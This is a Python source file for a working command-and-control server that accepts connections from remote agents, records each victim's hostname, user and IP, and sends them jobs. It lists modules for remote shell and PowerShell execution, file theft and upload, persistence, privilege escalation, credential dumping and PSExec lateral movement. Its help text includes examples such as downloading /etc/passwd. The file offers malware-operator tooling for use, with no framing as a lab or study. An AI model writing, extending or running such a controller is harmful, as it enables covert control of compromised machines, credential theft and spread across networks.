#!/usr/bin/env python3
import socket
import threading
import json
import sqlite3
import uuid
import time
from datetime import datetime
import logging
import os

class FastC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        self.jobs = {}
        self.running = True
        self.modules = self.load_modules()
        
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger('FastC2Server')
        
        self.init_database()
    
    def load_modules(self):
        """Load all available modules with descriptions"""
        return {
            # System Information
            'sysinfo': {
                'name': 'System Information',
                'description': 'Get comprehensive system and network information',
                'category': 'Discovery',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user'
            },
            'process_list': {
                'name': 'Process List', 
                'description': 'List running processes with details',
                'category': 'Discovery',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user'
            },
            
            # Command Execution
            'shell': {
                'name': 'Shell Command',
                'description': 'Execute system commands',
                'category': 'Execution', 
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user'
            },
            'powershell': {
                'name': 'PowerShell',
                'description': 'Execute PowerShell commands (Windows only)',
                'category': 'Execution',
                'platforms': ['windows'],
                'privileges': 'user'
            },
            
            # File Operations
            'download': {
                'name': 'Download File',
                'description': 'Download file from target to C2 server',
                'category': 'File Operations',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user'
            },
            'upload': {
                'name': 'Upload File', 
                'description': 'Upload file from C2 server to target',
                'category': 'File Operations',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user'
            },
            'file_browser': {
                'name': 'File Browser',
                'description': 'Browse and manipulate filesystem',
                'category': 'File Operations',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user'
            },
            
            # Persistence
            'persistence': {
                'name': 'Persistence',
                'description': 'Establish persistence mechanisms',
                'category': 'Persistence',
                'platforms': ['windows', 'linux'],
                'privileges': 'admin'
            },
            
            # Privilege Escalation
            'get_system': {
                'name': 'Get System',
                'description': 'Attempt privilege escalation',
                'category': 'Privilege Escalation', 
                'platforms': ['windows'],
                'privileges': 'user'
            },
            
            # Reconnaissance
            'network_scan': {
                'name': 'Network Scan',
                'description': 'Scan local network for hosts and services',
                'category': 'Discovery',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user'
            },
            'user_enum': {
                'name': 'User Enumeration',
                'description': 'Enumerate users and groups',
                'category': 'Discovery',
                'platforms': ['windows', 'linux'],
                'privileges': 'user'
            },
            
            # Credential Access
            'dump_creds': {
                'name': 'Dump Credentials',
                'description': 'Extract credentials from system',
                'category': 'Credential Access',
                'platforms': ['windows'],
                'privileges': 'admin'
            },
            
            # Lateral Movement
            'psexec': {
                'name': 'PSExec',
                'description': 'Execute commands on remote systems',
                'category': 'Lateral Movement',
                'platforms': ['windows'],
                'privileges': 'admin'
            }
        }
    
    def init_database(self):
        self.conn = sqlite3.connect('data/fast_c2.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                architecture TEXT,
                os_version TEXT,
                internal_ip TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )
        ''')
        self.conn.commit()
    
    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.logger.info(f"🚀 Fast C2 Server with Modules started on {self.host}:{self.port}")
            
            listener_thread = threading.Thread(target=self.accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            self.start_command_interface()
            
        except Exception as e:
            self.logger.error(f"Failed to start server: {e}")
    
    def accept_connections(self):
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                client_socket.settimeout(10.0)
                
                agent_thread = threading.Thread(
                    target=self.handle_agent_connection,
                    args=(client_socket, addr)
                )
                agent_thread.daemon = True
                agent_thread.start()
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"Error accepting connection: {e}")
    
    def handle_agent_connection(self, client_socket, addr):
        agent_id = None
        
        try:
            data = client_socket.recv(4096).decode('utf-8')
            if not data:
                return
                
            message = json.loads(data)
            agent_id = message.get('agent_id')
            
            if not agent_id or message.get('type') != 'checkin':
                return
            
            self.register_agent(agent_id, message.get('system_info', {}), addr, client_socket)
            self.logger.info(f"New agent connected: {agent_id} from {addr[0]}")
            
            while self.running and agent_id in self.agents:
                try:
                    if agent_id in self.jobs and self.jobs[agent_id]:
                        job = self.jobs[agent_id].pop(0)
                        client_socket.send(json.dumps(job).encode('utf-8'))
                        self.logger.info(f"Sent job to {agent_id}: {job['module_name']}")
                    
                    client_socket.settimeout(1.0)
                    try:
                        data = client_socket.recv(4096).decode('utf-8')
                        if data:
                            response = json.loads(data)
                            self.handle_agent_response(agent_id, response)
                    except socket.timeout:
                        continue
                    except json.JSONDecodeError:
                        continue
                        
                except Exception as e:
                    self.logger.error(f"Error communicating with {agent_id}: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"Agent connection error: {e}")
        finally:
            if agent_id and agent_id in self.agents:
                del self.agents[agent_id]
                self.logger.info(f"Agent disconnected: {agent_id}")
            try:
                client_socket.close()
            except:
                pass
    
    def register_agent(self, agent_id, system_info, addr, socket):
        self.agents[agent_id] = {
            'socket': socket,
            'system_info': system_info,
            'ip': addr[0],
            'last_seen': datetime.now()
        }
        
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                agent_id,
                system_info.get('hostname', 'Unknown'),
                system_info.get('username', 'Unknown'),
                system_info.get('architecture', 'Unknown'),
                system_info.get('os_version', 'Unknown'),
                addr[0],
                datetime.now(),
                datetime.now(),
                'active'
            ))
            self.conn.commit()
        except Exception as e:
            self.logger.error(f"Database error: {e}")
    
    def handle_agent_response(self, agent_id, response):
        if response.get('type') == 'job_result':
            job_id = response.get('job_id')
            output = response.get('output', '')
            
            print(f"\n[📡] INSTANT RESULT from {agent_id}:")
            print(f"    Job: {job_id}")
            print(f"    Output:\n{'-'*40}")
            print(f"{output}")
            print(f"{'-'*40}")
            print(f"C2> ", end='', flush=True)
    
    def send_job(self, agent_id, module_name, arguments=None):
        if agent_id not in self.agents:
            return False
        
        job_id = f"job_{int(time.time())}"
        job = {
            'type': 'job',
            'job_id': job_id,
            'module_name': module_name,
            'arguments': arguments or {}
        }
        
        if agent_id not in self.jobs:
            self.jobs[agent_id] = []
        
        self.jobs[agent_id].append(job)
        self.logger.info(f"Queued job for {agent_id}: {module_name}")
        return True
    
    def start_command_interface(self):
        def command_loop():
            while self.running:
                try:
                    cmd = input("\nC2> ").strip()
                    self.handle_command(cmd)
                except (KeyboardInterrupt, EOFError):
                    print("\n[!] Shutting down...")
                    self.running = False
                    break
                except Exception as e:
                    print(f"[-] Command error: {e}")
        
        thread = threading.Thread(target=command_loop)
        thread.daemon = True
        thread.start()
    
    def handle_command(self, command):
        if command == 'exit':
            self.running = False
        elif command == 'agents':
            self.list_agents()
        elif command == 'status':
            self.show_status()
        elif command == 'help':
            self.show_help()
        elif command == 'modules':
            self.list_modules()
        elif command.startswith('jobs '):
            self.handle_job_command(command)
        elif command.startswith('use '):
            self.handle_use_command(command)
        elif command == 'clear':
            os.system('clear')
        else:
            print("Unknown command. Type 'help'")
    
    def list_agents(self):
        if not self.agents:
            print("No active agents")
            return
        
        print(f"\nActive Agents ({len(self.agents)}):")
        print("-" * 60)
        for agent_id, info in self.agents.items():
            sysinfo = info.get('system_info', {})
            print(f"ID: {agent_id}")
            print(f"  IP: {info.get('ip', 'Unknown')}")
            print(f"  Hostname: {sysinfo.get('hostname', 'Unknown')}")
            print(f"  User: {sysinfo.get('username', 'Unknown')}")
            print(f"  OS: {sysinfo.get('os_version', 'Unknown')}")
            print("-" * 60)
    
    def list_modules(self):
        """Display all available modules organized by category"""
        categories = {}
        
        for module_id, module_info in self.modules.items():
            category = module_info['category']
            if category not in categories:
                categories[category] = []
            categories[category].append((module_id, module_info))
        
        print(f"\n🛠️  Available Modules ({len(self.modules)} total):")
        print("=" * 80)
        
        for category, modules in categories.items():
            print(f"\n📂 {category}:")
            print("-" * 40)
            for module_id, module_info in modules:
                platforms = ", ".join(module_info['platforms'])
                privs = module_info['privileges']
                print(f"  {module_id:<15} - {module_info['name']}")
                print(f"      {module_info['description']}")
                print(f"      Platforms: {platforms} | Privileges: {privs}")
    
    def show_status(self):
        print(f"\n🚀 Fast C2 Server Status:")
        print(f"  Active agents: {len(self.agents)}")
        print(f"  Available modules: {len(self.modules)}")
        print(f"  Pending jobs: {sum(len(jobs) for jobs in self.jobs.values())}")
        print(f"  Listening: {self.host}:{self.port}")
    
    def show_help(self):
        print("\n🚀 Fast Mode Commands:")
        print("  agents          - List active agents")
        print("  status          - Show server status")
        print("  modules         - Show all available modules")
        print("  use <agent_id>  - Enter interactive mode")
        print("  jobs <agent_id> <module> [args] - Send job")
        print("  clear           - Clear screen")
        print("  exit            - Shutdown server")
        print("  help            - Show this help")
        
        print("\n💡 Module Usage Examples:")
        print("  jobs abc123 sysinfo")
        print("  jobs abc123 shell whoami")
        print("  jobs abc123 download /etc/passwd")
        print("  jobs abc123 persistence registry")
    
    def handle_job_command(self, command):
        try:
            parts = command.split(' ', 3)
            if len(parts) < 3:
                print("Usage: jobs <agent_id> <module> [arguments]")
                print("Use 'modules' to see available modules")
                return
            
            agent_id = parts[1]
            module_name = parts[2]
            arguments = parts[3] if len(parts) > 3 else ""
            
            # Validate module exists
            if module_name not in self.modules:
                print(f"[-] Unknown module: {module_name}")
                print(f"[*] Use 'modules' command to see available modules")
                return
            
            args_dict = {}
            if arguments:
                if module_name == 'shell':
                    args_dict = {'command': arguments}
                elif module_name == 'download':
                    args_dict = {'remote_path': arguments}
                elif module_name == 'upload':
                    # Format: upload local_path remote_path
                    upload_parts = arguments.split(' ', 1)
                    if len(upload_parts) == 2:
                        args_dict = {'local_path': upload_parts[0], 'remote_path': upload_parts[1]}
                    else:
                        args_dict = {'local_path': upload_parts[0]}
                else:
                    try:
                        args_dict = json.loads(arguments)
                    except:
                        args_dict = {'args': arguments}
            
            if self.send_job(agent_id, module_name, args_dict):
                module_info = self.modules[module_name]
                print(f"[✓] {module_info['name']} job sent to {agent_id}")
            else:
                print(f"[-] Agent {agent_id} not found or not connected")
            
        except Exception as e:
            print(f"[-] Job failed: {e}")
    
    def handle_use_command(self, command):
        parts = command.split(' ')
        if len(parts) < 2:
            print("Usage: use <agent_id>")
            return
        
        agent_id = parts[1]
        if agent_id not in self.agents:
            print(f"[-] Agent {agent_id} not connected")
            return
        
        agent_info = self.agents[agent_id]
        sysinfo = agent_info.get('system_info', {})
        
        print(f"[+] Interactive mode with {agent_id} (Instant responses!)")
        print(f"    Hostname: {sysinfo.get('hostname', 'Unknown')}")
        print(f"    User: {sysinfo.get('username', 'Unknown')}")
        print(f"    OS: {sysinfo.get('os_version', 'Unknown')}")
        print("    Type commands directly or 'back' to exit")
        print("    Type 'help' for module list")
        
        while True:
            try:
                cmd = input(f"\nC2[{agent_id[:8]}]> ").strip()
                if cmd == 'back':
                    break
                elif cmd in ['exit', 'quit']:
                    self.running = False
                    break
                elif cmd == 'help':
                    self.show_interactive_help()
                elif cmd:
                    self.handle_interactive_command(agent_id, cmd)
                        
            except (KeyboardInterrupt, EOFError):
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def show_interactive_help(self):
        print("\n📋 Interactive Mode - Available Commands:")
        print("  sysinfo                    - System information")
        print("  process_list               - Running processes")
        print("  shell <command>            - Execute command")
        print("  download <remote_path>     - Download file")
        print("  upload <local> [remote]    - Upload file")
        print("  file_browser [path]        - Browse files")
        print("  persistence [method]       - Establish persistence")
        print("  network_scan [subnet]      - Network scan")
        print("  user_enum                  - Enumerate users")
        print("  back                       - Exit interactive mode")
        print("  help                       - Show this help")
    
    def handle_interactive_command(self, agent_id, command):
        parts = command.split(' ', 1)
        module_name = parts[0]
        arguments = parts[1] if len(parts) > 1 else ""
        
        # Map common commands to modules
        command_map = {
            'ls': 'file_browser',
            'dir': 'file_browser', 
            'ps': 'process_list',
            'whoami': 'shell',
            'pwd': 'shell',
            'cd': 'file_browser'
        }
        
        actual_module = command_map.get(module_name, module_name)
        
        # Handle special cases
        args_dict = {}
        if actual_module == 'shell':
            if module_name in ['whoami', 'pwd']:
                args_dict = {'command': module_name}
            else:
                args_dict = {'command': arguments}
        elif actual_module == 'file_browser':
            if module_name in ['ls', 'dir']:
                args_dict = {'path': arguments or '.'}
            elif module_name == 'cd':
                args_dict = {'action': 'change_dir', 'path': arguments}
            else:
                args_dict = {'path': arguments or '.'}
        elif actual_module == 'download':
            args_dict = {'remote_path': arguments}
        elif actual_module == 'upload':
            upload_parts = arguments.split(' ', 1)
            if len(upload_parts) == 2:
                args_dict = {'local_path': upload_parts[0], 'remote_path': upload_parts[1]}
            else:
                args_dict = {'local_path': upload_parts[0]}
        else:
            if arguments:
                try:
                    args_dict = json.loads(arguments)
                except:
                    args_dict = {'args': arguments}
        
        if actual_module not in self.modules:
            print(f"[-] Unknown command: {module_name}")
            print(f"[*] Type 'help' for available commands")
            return
        
        if self.send_job(agent_id, actual_module, args_dict):
            module_info = self.modules[actual_module]
            print(f"[→] {module_info['name']} sent...")
        else:
            print(f"[-] Failed to send command")

if __name__ == "__main__":
    server = FastC2Server('0.0.0.0', 4444)
    server.start()
    
    try:
        while server.running:
            time.sleep(1)
    except KeyboardInterrupt:
        server.running = False